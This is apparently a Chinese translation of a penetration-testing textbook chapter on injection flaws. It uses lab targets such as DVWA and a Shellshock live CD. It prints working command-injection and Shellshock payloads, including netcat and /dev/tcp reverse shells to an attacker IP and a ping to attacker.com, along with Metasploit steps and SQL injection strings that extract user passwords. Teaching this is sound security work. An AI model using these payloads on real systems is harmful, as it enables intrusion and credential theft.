# Kali Linux Web 渗透测试第三版（二）

> 原文：[`annas-archive.org/md5/D70608E075A2D7C8935F4D63EA6A10A3`](https://annas-archive.org/md5/D70608E075A2D7C8935F4D63EA6A10A3)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第五章：检测和利用基于注入的缺陷

根据 OWASP Top 10 2013 列表([`www.owasp.org/index.php/Top_10_2013-Top_10`](https://www.owasp.org/index.php/Top_10_2013-Top_10))，Web 应用程序中最关键的缺陷是注入漏洞，并且它在 2017 年的列表中保持了其位置。

([`www.owasp.org/index.php/Top_10-2017_Top_10`](https://www.owasp.org/index.php/Top_10-2017_Top_10)) 发布候选版。交互式 Web 应用程序接受用户输入，处理它，并将输出返回给客户端。当应用程序容易受到注入漏洞时，它接受用户的输入而不进行适当或任何验证，并继续处理。这导致应用程序不打算执行的操作。恶意输入欺骗应用程序，迫使底层组件执行应用程序未编程的任务。换句话说，注入漏洞允许攻击者随意控制应用程序的组件。

在本章中，我们将讨论当今 Web 应用程序中的主要注入漏洞，包括检测和利用它们的工具，以及如何避免易受攻击或修复现有缺陷。这些缺陷包括以下内容：

+   命令注入漏洞

+   SQL 注入漏洞

+   基于 XML 的注入

+   NoSQL 注入

注入漏洞用于访问应用程序发送数据的底层组件，以执行某些任务。以下表格显示了 Web 应用程序常用的最常见组件，当用户输入未经应用程序验证时，这些组件经常成为注入攻击的目标：

| **组件** | **注入漏洞** |
| --- | --- |
| 操作系统 | 命令注入 |
| 数据库 | SQL/NoSQL 注入 |
| Web 浏览器/客户端 | 跨站脚本攻击 |
| LDAP 目录 | LDAP 注入 |
| XML | XPATH / XML 外部实体注入 |

# 命令注入

动态性质的 Web 应用程序可能使用脚本在 Web 服务器上调用某些功能，以处理从用户接收到的输入。攻击者可能会尝试通过绕过应用程序实施的输入验证过滤器来在命令行中处理此输入。**命令注入**通常在同一 Web 服务器上调用命令，但根据应用程序的架构，也可能在不同的服务器上执行命令。

让我们来看一个简单的代码片段，它容易受到命令注入漏洞的攻击，来自 DVWA 的命令注入练习。这是一个非常简单的脚本，接收一个 IP 地址并向该地址发送 ping（ICMP 数据包）：

```
<?php 
  $target = $_REQUEST[ 'ip' ]; 
  $cmd = shell_exec( 'ping  -c 3 ' . $target ); 
  $html .= '<pre>'.$cmd.'</pre>'; 
  echo $html; 
?> 
```

正如您所看到的，在从用户接受`ip`参数之前，没有进行输入验证，这使得此代码容易受到命令注入攻击。要登录到 DVWA，使用的默认凭据是`admin`/`admin`。

恶意用户可以使用以下请求来注入附加命令，应用程序将接受而不引发异常：

```
http://server/page.php?ip=127.0.0.1;uname -a
```

应用程序从客户端接受用户输入的值而不进行验证，并将其连接到`ping -c 3`命令，以构建在 Web 服务器上运行的最终命令。服务器的响应显示在以下屏幕截图中。由于应用程序未能验证用户输入，显示了底层操作系统的版本以及对给定地址进行 ping 的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00116.jpeg)

注入的附加命令将使用 Web 服务器的权限运行。现在大多数 Web 服务器都以受限权限运行，但即使权限有限，攻击者也可以利用并窃取重要信息。

命令注入可以用于通过注入`wget`命令使服务器下载和执行恶意文件，或者通过以下示例演示的方式获得对服务器的远程 shell。

首先，在 Kali Linux 中设置一个监听器。**Netcat**有一种非常简单的方法来做到这一点：

```
nc -lvp 12345  
```

Kali Linux 现在已设置为在端口`12345`上监听连接。接下来，将以下命令注入到受漏洞的服务器中：

```
nc.traditional -e /bin/bash 10.7.7.4 12345 
```

在一些现代 Linux 系统中，原始的 Netcat 已被替换为不包含某些可能存在安全风险的选项的版本，例如允许在连接时执行命令的`-e`选项。这些系统通常在名为`nc.traditional`的命令中包含传统版本的 Netcat。在尝试使用 Netcat 访问远程系统时，请尝试这两个选项。

请注意，`10.7.7.4`是示例中 Kali 机器的 IP 地址，`12345`是用于监听连接的 TCP 端口。发送请求后，您应该在 Kali Linux 中接收到连接，并能够在非交互式 shell 中发出命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00117.jpeg)

非交互式 shell 允许您执行命令并查看结果，但无法与命令进行交互，也无法查看错误输出，例如使用文本编辑器时。

# 识别注入数据的参数

当您测试 Web 应用程序的命令注入漏洞，并确认应用程序正在与底层操作系统的命令行交互时，下一步是操纵和探测应用程序中的不同参数，并查看它们的响应。应该测试以下参数是否存在命令注入漏洞，因为应用程序可能使用其中一个参数在 Web 服务器上构建命令：

+   **GET**：使用此方法，输入参数通过 URL 发送。在之前的示例中，客户端的输入使用`GET`方法传递给服务器，并且容易受到命令注入漏洞的攻击。应该测试使用`GET`方法请求发送的任何用户可控参数。

+   **POST**：在此方法中，输入参数通过 HTTP 正文发送。类似于使用`GET`方法传递的输入；从最终用户获取的数据也可以使用`POST`方法在 HTTP 请求的正文中传递。然后，Web 应用程序可以使用这些数据在服务器端构建命令查询。

+   **HTTP 头部**：应用程序通常使用头字段来识别最终用户，并根据头部的值向用户显示定制信息。这些参数也可以被应用程序用于构建进一步的查询。检查命令注入的一些重要头字段如下：

+   `Cookies`

+   `X-Forwarded-For`

+   `User-Agent`

+   `Referrer`

# 基于错误和盲注命令注入

当通过输入参数传递命令并在 Web 浏览器中显示命令的输出时，很容易确定应用程序是否容易受到命令注入漏洞的攻击。输出可能是错误信息或您尝试运行的命令的实际结果。作为渗透测试人员，您将根据应用程序使用的 shell 修改和添加其他命令，并从应用程序中获取信息。当输出在 Web 浏览器中显示时，称为**基于错误的**或**非盲注命令注入**。

在另一种形式的命令注入中，即**盲注命令注入**，您注入的命令的结果不会显示给用户，也不会返回错误消息。攻击者将不得不依赖其他方式来确定命令是否确实在服务器上执行。当命令的输出显示给用户时，您可以使用任何 bash shell 或 Windows 命令，例如`ls`、`dir`、`ps`或`tasklist`，具体取决于底层操作系统。然而，在测试盲注时，您需要谨慎选择命令。作为道德黑客，当应用程序不显示结果时，识别注入漏洞存在的最可靠和安全的方法是使用`ping`命令。

攻击者通过注入`ping`命令将网络数据包发送到他们控制的机器上，并使用数据包捕获在该机器上查看结果。这可能在以下几个方面证明有用：

+   由于`ping`命令在 Linux 和 Windows 中都相似，除了一些细微的差异，如果应用程序容易受到注入漏洞的影响，该命令肯定会运行。

+   通过分析`ping`输出中的响应，攻击者还可以使用 TTL 值识别底层操作系统。

+   `ping`输出中的响应还可以使攻击者了解防火墙及其规则，因为目标环境允许 ICMP 数据包通过其防火墙。这可能在后期的利用阶段证明有用，因为 Web 服务器与攻击者之间有一条路径。

+   `ping`实用程序通常不受限制；即使应用程序在非特权帐户下运行，您执行命令的机会也是有保证的。

+   输入缓冲区的大小通常是有限的，只能接受有限数量的字符，例如用户名输入字段。`ping`命令以及 IP 地址和一些附加参数可以轻松注入到这些字段中。

# 用于命令分隔符的元字符

在前面的示例中，分号被用作元字符，它分隔了实际输入和您尝试注入的命令。除了分号之外，还有几个其他元字符可用于注入命令。

开发人员可能设置过滤器以阻止分号元字符。这将阻止您的注入数据，因此您还需要尝试其他元字符，如下表所示：

| **符号** | **用法** |
| --- | --- |
| `;` | 分号是最常用的元字符，用于测试注入漏洞。Shell 按顺序运行所有命令，以分号分隔。 |
| `&&` | 双与运算符仅在左侧命令成功执行时才运行右侧命令。例如，可以注入密码字段以及正确的凭据。一旦用户通过身份验证进入系统，就可以运行注入的命令。 |
| `&#124;&#124;` | 双管道元字符是双与元字符的直接相反。它仅在左侧命令失败时才运行右侧命令。以下是此命令的示例：`**cd invalidDir &#124;&#124; ping -c 2 attacker.com**` |
| `( )` | 使用分组元字符，您可以将多个命令的输出组合并存储在文件中。以下是此命令的示例：`**(ps; netstat) > running.txt**` |
| `` ` `` | 单引号元字符用于强制 shell 解释并运行反引号之间的命令。以下是此命令的示例：`**Variable= "OS version `uname -a`" && echo $variable**` |
| `>>` | 此字符将左侧命令的输出追加到右侧字符指定的文件中。以下是此命令的示例：`**ls -la >> listing.txt**` |
| `&#124;` | 单管道将左侧命令的输出作为右侧指定命令的输入。以下是此命令的示例：`**netstat -an &#124; grep :22**` |

作为攻击者，你经常需要使用前面的元字符的组合来绕过开发人员设置的过滤器，以便注入你的命令。

# 利用 shellshock

**shellshock**漏洞于 2014 年 9 月被发现，并分配了初始 CVE 标识符 2014-6271。Shellshock 是一个**任意代码执行**（**ACE**）漏洞，被认为是有史以来发现的最严重的缺陷之一。

**Bourne Again Shell**（**bash**）处理环境变量的方式中发现了缺陷，影响使用 bash 作为操作系统接口的应用程序和操作系统范围很广。大多数基于 Unix 的系统（包括 Mac OS X）中的 DHCP 客户端、命令行终端和 web 应用程序中的 CGI 脚本都受到影响。当将空函数设置为环境变量时触发该缺陷。空函数如下所示：

```

() { :; };

```

当 bash shell 接收到前面的一系列字符以及变量时，与其拒绝字符串，bash shell 会接受它以及随后的变量，并将其作为服务器上的命令执行。

正如你在之前利用命令注入漏洞时所看到的，bash shell 常用于 web 应用程序，并且你经常会看到后端、中间件和监控 web 应用程序将变量传递给 bash shell 以执行一些任务。接下来将展示一个利用 shellshock 漏洞的示例，使用来自 PentesterLab 的易受攻击的 live CD（[`www.pentesterlab.com/exercises/cve-2014-6271`](https://www.pentesterlab.com/exercises/cve-2014-6271)）。

# 获取反向 shell

如果你使用 live CD 镜像启动虚拟机，你会得到一个最小系统，其中包括一个加载显示系统信息的非常简单网页的 web 服务器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00118.jpeg)

如果你查看代理中的请求，你会注意到一个指向`/cgi-bin/status`的请求，其响应包括系统的正常运行时间以及看起来像是`uname -a`命令的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00119.jpeg)

要获取此类信息，状态脚本需要与操作系统通信。有可能它正在使用 bash 进行通信，因为 bash 是许多基于 Unix 的系统的默认 shell，并且当处理 CGI 脚本时，`User-Agent` 标头会变成一个环境变量。要测试是否实际上存在命令注入，你需要测试不同版本的注入。假设你希望目标服务器返回 ping 以验证它是否执行命令。以下是使用通用目标地址的一些示例。注意使用空格和分隔符：

```

() { :;}; ping -c 1 192.168.1.1

() { :;}; /bin/ping -c 1 192.168.1.1

() { :;}; bash -c "ping -c 1 192.168.1.1"

() { :;}; /bin/bash -c "ping -c 1 attacker.com"

() { :;}; /bin/sh -c "ping -c 1 192.168.1.1"

```

作为测试的一部分，你将请求发送到 Burp Suite 的 Repeater，并仅在 `User-Agent` 标头中提交 `() { :;};` 空函数，并获得与无注入相同的有效响应：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00120.jpeg)

如果尝试注入诸如 `uname`、`id` 或单个 `ping` 等命令，你会收到一个错误。这意味着标头实际上正在被处理，你只需要找到发送命令的正确方法：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00121.jpeg)

经过一些尝试和错误，你找到了正确的命令。`ping -c 1 10.7.7.4` 命令将在服务器上执行，并且通过网络嗅探器（例如 Wireshark）在攻击者的机器上捕获到 ping：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00122.jpeg)

现在你已经找到了正确的注入命令，你可以尝试直接访问服务器的 shell。为此，首先使用 Netcat 设置监听器如下所示：

```

nc -lvp 12345

```

然后注入命令。这一次，你正在注入一个更高级的命令，如果成功，将产生一个完全交互式的 shell：

```

() { :;}; /bin/bash -c "ping -c 1 10.7.7.4; bash -i >& /dev/tcp/10.7.7.4/12345 0>&1"

```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00123.jpeg)

bash shell 将变量解释为命令并执行它，而不是接受变量作为字符序列。这看起来与先前讨论的命令注入漏洞非常相似。然而，这里的主要区别在于，bash shell 本身易受代码注入的影响，而不是网站。由于许多应用程序（如 DHCP、SSH、SIP 和 SMTP）都使用 bash shell，因此攻击面大大增加。通过 HTTP 请求利用漏洞仍然是最常见的方法，因为 bash shell 经常与 CGI 脚本一起使用。

要识别 Web 服务器中的 CGI 脚本，除了使用代理分析请求和响应之外，还可以使用**Nikto**和**DIRB**。

# 使用 Metasploit 进行利用

从终端启动 Metasploit 控制台 (`msfconsole`)。你需要在 `exploit/multi/http` 下选择 `apache_mod_cgi_bash_env_exec` 利用程序：

```

use exploit/multi/http/apache_mod_cgi_bash_env_exec

```

然后，你需要使用 `set` 命令定义远程主机和目标 URI 值。你还需要选择 `reverse_tcp` 负载，该负载将使 Web 服务器连接到攻击者的机器。可以通过导航到 linux | x86 | meterpreter 找到此选项。

确保本地主机 (`SRVHOST`) 和本地端口 (`SRVPORT`) 的值是正确的。你可以使用 `set` 命令设置这些值和其他值：

```

set SRVHOST 0.0.0.0

set SRVPORT 8080

```

使用 `0.0.0.0` 主机，服务器将通过黑客启用的所有网络接口进行侦听。此外，请验证黑客机器上选定的端口是否已经有服务在运行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00124.jpeg)

一旦准备就绪，请输入 `exploit`，如果服务器容易受到 shellshock 攻击，则会看到 `meterpreter` 提示符。*对于黑客来说，shell 是最有价值的财产*。`meterpreter` 会话是在后渗透阶段非常有用的工具。在这个阶段，黑客真正了解到他们已经入侵的机器的价值。Meterpreter 拥有大量内置命令。

Meterpreter 是 Metasploit 中包含的高级远程 Shell。在 Windows 系统中执行时，它包括提升权限、转储密码和密码哈希、模拟用户、嗅探网络流量、记录按键并在目标机器上执行许多其他利用的模块。

以下截图显示了 `sysinfo` 命令的输出和 Meterpreter 中的远程系统 shell：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00125.jpeg)

# SQL 注入

与后端数据库进行交互以检索和写入数据是 Web 应用程序执行的最关键任务之一。将数据存储在一系列表中的关系数据库是实现此目的的最常见方法，而对于查询信息，**结构化查询语言**（**SQL**）是事实上的标准。

为了允许用户选择要查看的信息或根据其配置文件筛选他们可以看到的内容，从 cookie、输入表单和 URL 变量获取的输入用于构建传递回数据库进行处理的 SQL 语句。由于用户输入参与了构建 SQL 语句，因此应用程序的开发人员需要在将其传递到后端数据库之前仔细验证它。如果这种验证没有得到适当处理，恶意用户可能能够发送 SQL 查询和命令，这些查询和命令将由数据库引擎执行，而不是作为预期值进行处理。

利用用户输入信任来执行 SQL 查询而不是使用这些值作为过滤参数的攻击类型被称为**SQL 注入**。

# SQL 入门

为了理解 SQL 注入漏洞，首先需要对 SQL 有一些了解。首先，让我们来看一些基本的数据库概念：

+   **列或字段：** 列或字段是指一种特定的数据片段，指的是所有实体的单个特征，比如用户名、地址或密码。

+   **行或记录：** 行或记录是一组信息或一组字段值，与单个实体相关联，例如与单个用户或单个客户相关的信息。

+   **表：** 表是包含有关同一类型元素的信息的记录列表，例如用户、产品或博客文章的表。

+   **数据库：** 数据库是与同一系统或一组系统相关联的全部表的集合，通常彼此相关。例如，一个在线商店数据库可能包含客户、产品、销售、价格、供应商和员工用户的表。

为了获取如此复杂的结构的信息，几乎所有现代编程语言和**数据库管理系统**（**DBMS**）都支持使用 SQL。SQL 允许开发人员对数据库执行以下操作：

| **语句** | **描述** |
| --- | --- |
| `CREATE` | 用于创建数据库和表 |
| `SELECT` | 允许从数据库中检索信息 |
| `UPDATE` | 允许修改数据库中现有数据 |
| `INSERT` | 允许在数据库中插入新数据 |
| `DELETE` | 用于从数据库中删除记录 |
| `DROP` | 用于永久删除表和数据库 |

其他更复杂的功能，如存储过程、完整性检查、备份和文件系统访问也受支持，并且它们的实现大多取决于所使用的数据库管理系统（DBMS）。

大多数合法的 SQL 操作任务都使用了前述语句。然而，如果不控制它们的使用，`DELETE`和`DROP`语句可能会导致信息丢失。在渗透测试中，不鼓励使用`DROP`或`DELETE`进行 SQL 注入攻击，或者我应该说是禁止的，除非客户明确要求。

SQL 语句中的`；`（分号）元字符类似于命令注入中的用法，用于在同一行上组合多个查询。

# SELECT 语句

在日常数据库使用中的基本操作是检索信息。这可以通过`SELECT`来完成。基本语法如下：

```

SELECT [elements] FROM [table] WHERE [conditions]

```

在这里，`elements`可以是通配符（例如，`*`选择所有内容），或者是您想要检索的列的列表。`table`是您想要检索信息的表。`WHERE`子句是可选的，如果使用，查询将只返回满足条件的行。例如，您可以选择所有价格低于 100 美元（USD）的产品的`name`、`description`和`price`列：

```

SELECT name,description,price FROM products WHERE price<100

```

`WHERE`子句还可以使用布尔运算符制作更复杂的条件：

```

SELECT columnA FROM tableX WHERE columnE='employee' AND columnF=100;

```

如果`WHERE`子句后面的条件得到满足，即`columnE`具有`employee`字符串值，而`columnF`具有`100`值，上述 SQL 语句将从名为`tableX`的表中返回`columnA`的值。

# 漏洞代码

类似于之前讨论的命令注入漏洞，使用`GET`方法传递的变量也经常用于构建 SQL 语句。例如，`/books.php?userinput=1` URL 将显示关于第一本书的信息。

在以下的 PHP 代码中，用户通过 `GET` 方法提供的输入直接添加到 SQL 语句中。`MySQL_query()` 函数将把 SQL 查询发送到数据库，`MySQL_fetch_assoc()` 函数将从数据库中以数组格式获取数据：

```

<?php

$stockID = $_GET["userinput"];

$SQL= "SELECT * FROM books WHERE ID=" . $stockID;

$result= MySQL_query($SQL);

$row = MySQL_fetch_assoc($result);

?>

```

没有适当的输入验证，攻击者可以控制 SQL 语句。如果你把 URL 改成 `/books.php?userinput=10-1`，以下查询将被发送到后端数据库：

```

SELECT * FROM books WHERE ID=10-1

```

如果第九本书的信息被显示，你可以得出结论：应用程序容易受到 SQL 注入攻击的影响，因为未经过滤的输入直接发送到数据库执行减法运算。

SQL 注入漏洞存在于 Web 应用程序中，而不是在数据库服务器上。

# SQL 注入测试方法

在前一节中，你目睹了对一个易受攻击的代码片段的攻击结果。很显然，如果用户输入在没有先进行验证的情况下直接连接到 SQL 查询中，用户可以注入不同的数值或代码，这些将由数据库中的 SQL 解释器处理执行。但是，如果你没有访问源代码怎么办？这在渗透测试中是最有可能发生的情况；那么，你如何识别这样的缺陷呢？

通过尝试简单的注入字符串并分析服务器的响应来获取答案。让我们看一个使用 **Damn Vulnerable Web Application** (**DVWA**) 的简单示例。在 SQL 注入部分，如果你在文本框中输入任何数字，比如 `2`，你将获取 ID 为该数字的用户的信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00126.jpeg)

现在尝试提交一个 `'`（撇号）字符，而不是一个数字，你会看到响应是一个非常描述性的错误消息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00127.jpeg)

这个唯一的回应告诉我们，该参数容易受到注入攻击，因为它表明在提交 ID 时有一个语法错误，在注入撇号后，形成的查询如下：

```

SELECT first_name, last_name FROM users WHERE user_id = '''

```

开放的撇号被注入的字符闭合。代码中已存在的撇号保持开放，这导致当数据库管理系统尝试解释句子时出错。

另一种检测注入的方法是让解析器执行布尔运算。尝试提交类似 `2' and '1'='1` 这样的内容。注意，你不需要发送第一个和最后一个撇号—这些将由 SQL 句子中已有的撇号完成，根据先前的错误消息推断。有时，你需要尝试多种组合，包括带有和不带有撇号、括号和其他分组字符，以发现句子的真实结构是如何组成的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00128.jpeg)

结果是相同 ID=2 的用户。这是预期的结果，因为你附加了一个始终成立的条件；也就是，`and '1'='1'`。

接下来，尝试一个始终为假的条件：`2' and '1'='2`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00129.jpeg)

从浏览器的地址栏中，你可以看到通过`GET`请求完成 ID 提交。对于错误条件的响应是空文本，而不是用户的详细信息。因此，即使 ID=2 的用户存在，句子的第二个条件也是假的，结果为空。这表明你可以将 SQL 代码注入到查询中，并可能从数据库中提取信息。

其他有用的测试字符串，可能帮助你识别 SQL 注入，如下：

+   **对数值输入的算术运算**：这些包括，`2+1`、`-1`和`0+1`。

+   **字母值**：在预期数字的地方使用这些（`a`，`b`，`c`，...）。

+   **分号 (;)**：在大多数 SQL 实现中，分号表示句子的结束。你可以注入一个分号，后跟另一个如`SLEEP`或`WAITFOR`的 SQL 语句，然后比较响应时间。如果它与你提供的暂停时间一致，则存在注入漏洞。

+   **注释**：注释标记（`#`，`//`，`/*`，`--`）使解释器忽略注释后的所有内容。通过在一个有效值之后注入这些，你应该得到一个与单独提交值时不同的响应。

+   **双引号 (")**：这可以代替撇号或单引号来界定字符串。

+   **通配符，字符%（百分比）和 _（下划线）**：这些也可以在`WHERE`条件中使用，因此如果代码存在漏洞，你可以注入它们；`%`表示所有字符串，`_`表示任意一个字符，但只是一个字符。例如，如果使用`LIKE`运算符而不是`=`，如在以下的 PHP 字符串连接中，如果我们提交百分号（`%`），你将得到所有用户作为结果：

```

"SELECT first_name, last_name FROM users WHERE first_name LIKE '" .

$name . "'"

```

或者，如果你提交像`"Ali__"`（带有两个下划线）这样的内容，你可能会得到如`"Alice"`、`"Aline"`、`"Alica"`、`"Alise"`和`"Alima"`这样的结果。

+   **UNION 运算符**：这在 SQL 中用于合并两个查询的结果。作为条件，两个查询的结果需要有相同数量的列。因此，如果你有一个返回三个列的脆弱查询，如刚才所示（选择两个列）并注入类似`UNION SELECT 1,2`的东西，你将得到一个有效的结果，或者如果你注入`UNION SELECT 1,2,3`，你会得到一个错误。如果结果相同，无论列数或差异如何不一致，那么输入可能不是脆弱的。

# 利用 SQL 注入提取数据

为了利用 SQL 注入漏洞从数据库中提取数据，你首先需要做的是理解查询是如何构建的，这样你才能知道在哪里以及如何注入你的有效载荷。

发现存在注入漏洞有助于你弄清楚`WHERE`条件是如何制定的。你还需要知道选择了多少列以及实际返回给客户端的是哪些列。

要获得列数，可以使用`ORDER BY`。从在有效值之后注入`ORDER BY 1`开始，以按第一行，第二行等顺序对结果进行排序，直到您因尝试使用不存在的行号来排序结果而出现错误为止。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00130.jpeg)

如前面的屏幕截图所示，通过按列`3`排序，查询失败，这告诉您它只返回了两列。并且请注意地址栏中指示您的注入是`2' order by 3 -- '`, 您需要添加注释以让解释器忽略查询的其余部分，因为在 SQL 中`ORDER`必须始终在句子的末尾。您还需要在注释前后添加空格（浏览器会将其替换为地址栏中的`+`），并在末尾关闭单引号以避免语法错误。

现在您知道查询返回两列，要查看它们在响应中是如何呈现的，请使用`UNION`。通过提交 `2' union select 1,2 -- '`, 您将看到第一列是名字，第二列是姓：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00131.jpeg)

现在您可以开始从数据库中提取信息。

# 获取基本环境信息

为了从数据库中提取信息，您需要知道要查找什么：有哪些数据库？我们的用户可以访问哪些？有哪些表，它们有哪些列？这是您需要向服务器询问的初始信息，以便能够查询所需获取的数据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00132.jpeg)

使用 DVWA 示例，假设您只有两列来获取信息，从询问数据库名称和应用程序用于连接到 DBMS 的用户开始。

这是通过 MySQL 中预定义的`database()`和`user()`函数完成的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00133.jpeg)

您还可以通过注入以下内容来询问服务器上的数据库列表：

```

2' union SELECT schema_name,2 FROM information_schema.schemata -- '

```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00134.jpeg)

`information_schema`是包含 MySQL 的所有配置和数据库定义信息的数据库，因此`dvwa`应该是与目标应用程序对应的数据库。现在让我们查询该数据库中包含的表：

```

2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema = 'dvwa' -- '

```

如屏幕截图所示，我们正在查询`information_schema.tables`表中定义的所有表的表名，其中`table_schema`（或数据库名称）为`'dvwa'`。从那里，您可以获取包含用户信息的表的名称，还可以询问其列及每个列的类型：

```

2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema = 'dvwa' and table_name = 'users' --'

```

每次请求只应选择一两个信息，因为您只有两个字段来显示信息。SQL 提供`CONCAT`函数，它可以连接两个或更多个字符串。您可以使用它将多个字段组合成一个单个值。您将使用`CONCAT`来提取用户 ID，名和姓，用户名和密码：

```

2' union select concat(user_id,'-',first_name,' ',last_name),concat(user,':',password) from dvwa.users -- '

```

**![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00135.jpeg)**

# 盲 SQL 注入

到目前为止，我们已经找到并利用了一种常见的 SQL 注入漏洞，在这种漏洞中，请求的信息显示在服务器的响应中。然而，还有一种不同类型的 SQL 注入，无论其是否存在，服务器响应都不会显示实际详细信息。这被称为**盲注 SQL 注入**。

要检测盲注 SQL 注入，您需要形成查询以获得是或否的响应。这意味着查询在结果为正或负时以一致的方式响应，以便您可以区分其中之一。这可以基于响应内容、响应代码或执行某些注入命令来实现。在最后一种情况下，最常见的方法是注入暂停命令并根据响应时间检测 true 或 false（基于时间的注入）。为了阐明这一点，让我们通过 DVWA 进行一个快速练习，您还将使用 Burp Suite 来方便地重新提交请求。

在基于时间的注入中，将形成一个查询，如果结果为 true，则会暂停处理 *N* 秒，并且如果结果为 false，则会在不暂停的情况下执行查询。在 MySQL 中使用 `SLEEP(N)` 函数，在 MS SQL Server 中使用 `WAITFOR DELAY '0:0:N'` 函数来实现。如果服务器需要这段时间才能响应，结果就为 true。

首先，转到 SQL 注入（盲注）。您将看到来自其他 SQL 注入练习的相同的用户 ID 文本框。如果您提交一个数字，它会显示相应用户的名字和姓氏。然而，这一次，如果您提交一个撇号或单引号，它会显示一个空的响应。但是，如果您提交 `1''` 会发生什么？它会显示用户 1 的信息，所以它是可注入的：

**![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00136.jpeg)**

让我们回顾一下您现在所拥有的信息。有一个有效的用户，ID=1。如果您提交一个不正确的查询或一个不存在的用户，结果只是一个空的信息空间。然后有真和假的状态。您可以通过提交 `1' and '1'='1 and 1' and '1'='2` 来测试这些状态：

**![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00137.jpeg)**

以下截图显示了虚假响应。请注意，浏览器的地址栏中会对某些字符进行编码（例如，`'='` 编码为 `'%3D'`）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00138.jpeg)

要询问是/否问题，您必须用返回 true 或 false 的查询替换 `'1'='1'`。您已经知道应用程序的数据库名称是 `'dvwa'`。现在提交以下内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00139.jpeg)

```

1' and database()='dvwa

```

在这里，您会收到一个肯定的响应。请记住，您不需要包含第一个和最后一个引号，因为它们已经在应用程序的代码中了。您怎么知道这一点？您需要逐个字符地迭代，找到每个字母，问诸如“当前数据库名称是否以 `?` 开头”这样的问题。这可以通过表单或 Burp 的 Repeater 逐个字符完成，也可以使用 Burp 的 Intruder 进行自动化。

从代理历史记录中向侵入者发送一个有效请求，并按照以下截图设置输入：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00140.jpeg)

请注意，在将`a`设置为输入后，会有 `%25`。这是 URL 编码的`%`（百分比）字符。 URL 编码由浏览器自动完成，有时服务器需要立即解释发送的字符。编码还可以用于绕过某些基本的验证过滤器。如上所述，百分比字符是一个通配符，可以匹配任何字符串。 在这里，我们正在说如果用户 ID 是 `1`，当前数据库的名称以 `a` 开头，然后跟着任何内容；有效载荷列表将是字母表中所有的字母和数字 0 到 9. SQL 字符串比较不区分大小写，除非特别指定。这意味着`A`和`a`是相同的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00141.jpeg)

现在你已经有了输入位置和有效载荷，但是你将如何区分真实响应和虚假响应呢？你需要在真实响应或虚假响应中匹配一些字符串。 你知道真实响应中总是包含`First name`文本，因为它显示了用户的信息。我们可以为此制定一个 Grep- Match 规则：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00142.jpeg)

现在开始攻击，查看`d`是否与真实响应匹配：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00143.jpeg)

要找到第二个字符，只需将输入位置前置一个 `d`（结果）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00144.jpeg)

再次开始攻击，你会发现`v`是下一个字符：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00145.jpeg)

持续这个过程，直到没有可能的输入返回积极的响应为止。 你也可以构建第一轮查询，使用以下注入来获取名称的长度，并迭代最后一个数字，直到找到正确的长度值为止：

```

1'+and+char_length(database())=1+--+'

```

请记住，由于侵入者不像浏览器那样添加编码，你可能需要自己添加或在负载配置中进行配置。在这里，我们用`+`号替换所有的空格。同时，请注意，由于`char_length()`的返回值是一个整数，你需要在其之后添加注释并关闭引号。

有关最常见 DBMS 中用于 SQL 注入的有用 SQL 命令的优秀参考资料可以在 PentestMonkey 的 SQL 注入小抄中找到：[`pentestmonkey.net/category/cheat-sheet/sql-injection`](http://pentestmonkey.net/category/cheat-sheet/sql-injection)。

# 自动化利用

正如你从前面的部分所看到的，利用 SQL 注入漏洞可能是一个棘手和耗时的任务。 幸运的是，有一些有用的工具可供渗透测试人员从易受攻击的应用程序中自动提取信息。

